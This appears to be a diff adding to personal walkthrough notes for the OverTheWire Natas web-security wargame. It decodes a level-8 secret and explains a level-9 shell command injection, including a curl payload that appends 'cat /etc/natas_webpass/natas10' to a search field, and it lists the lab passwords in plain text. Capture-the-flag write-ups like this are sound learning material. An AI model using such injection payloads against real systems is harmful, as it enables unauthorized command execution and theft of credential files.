@@ -56,3 +56,39 @@ note: 	The PHP code tells you exactly what it's doing: it's taking your input, r
 command ==> echo "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -d
 		output: oubWYf2kBq
 command ==> curl -u "natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q" -X POST -d "secret=oubWYf2kBq&submit=1" http://natas8.natas.labs.overthewire.org/
+
+level 10 	natas10			t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+note: The vulnerability here is that the website passes our input directly to a shell command without sanitizing it. We can use this to run a second, unauthorized command
+Step 1: Send the Request with curl
+
+	curl: This fetches the content of the webpage.
+
+	-s: The silent flag. This hides the progress meter, making the output clean.
+
+	-u "natas9:...": Provides our username and password to authenticate.
+
+	"http://... " (in quotes): The entire URL is quoted to prevent the shell from misinterpreting the & and other special characters.
+
+Step 2: The Command Injection Payload
+
+	?needle=x: We provide a search term (x) to satisfy the server's check that our input is not empty.
+
+	;%20: This is the crucial part. The semicolon ; separates two commands in a shell. The %20 is a URL-encoded space.
+
+	cat /etc/natas_webpass/natas10: This is the command we are injecting. It tells the server to cat (print the contents of) the password file.
+
+	The server's script now executes grep -i x dictionary.txt; cat /etc/natas_webpass/natas10.
+
+Step 3: Filter the Output with grep
+
+	|: The pipe. It takes all the raw HTML output from curl and sends it as input to the grep command.
+
+	grep -oE '[a-zA-Z0-9]{32}': This filters the output.
+
+	-o: Only prints the part of the line that matches our pattern.
+
+	-E: Enables extended regular expressions.
+
+	[a-zA-Z0-9]{32}: The pattern to match. We're looking for any string that is exactly 32 alphanumeric characters long.
+
+command ==> curl -s -u "natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t" "http://natas9.natas.labs.overthewire.org/?needle=x;%20cat%20/etc/natas_webpass/natas10&submit=Search" | grep -oE '[a-zA-Z0-9]{32}'
